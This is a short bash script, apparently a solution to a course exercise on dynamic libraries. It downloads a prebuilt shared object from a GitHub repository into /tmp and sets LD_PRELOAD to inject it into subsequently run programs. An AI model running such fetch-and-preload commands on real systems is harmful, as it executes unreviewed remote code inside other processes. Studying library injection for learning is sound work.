#!/bin/bash
wget -O /tmp/injection.so https://github.com/mikechege01/alx-low_level_programming/raw/master/0x18-dynamic_libraries/injection.so
export LD_PRELOAD=/tmp/injection.so
